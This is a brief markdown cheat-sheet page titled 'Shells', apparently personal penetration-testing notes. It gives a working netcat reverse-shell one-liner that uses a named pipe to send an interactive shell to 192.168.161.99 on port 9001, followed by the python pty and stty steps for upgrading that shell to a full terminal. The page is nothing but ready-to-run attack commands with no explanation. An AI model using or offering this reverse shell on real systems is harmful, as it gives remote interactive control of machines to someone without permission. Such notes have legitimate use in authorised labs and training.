---
title: 'Shells'
description: ''
pubDate: 'Nov 28 2025'
---

#### nc

```
which nc
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.161.99 9001 >/tmp/f
```

#### upgrade shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
^Z #(Ctrl+Z)
stty raw -echo && fg
export TERM=xterm
```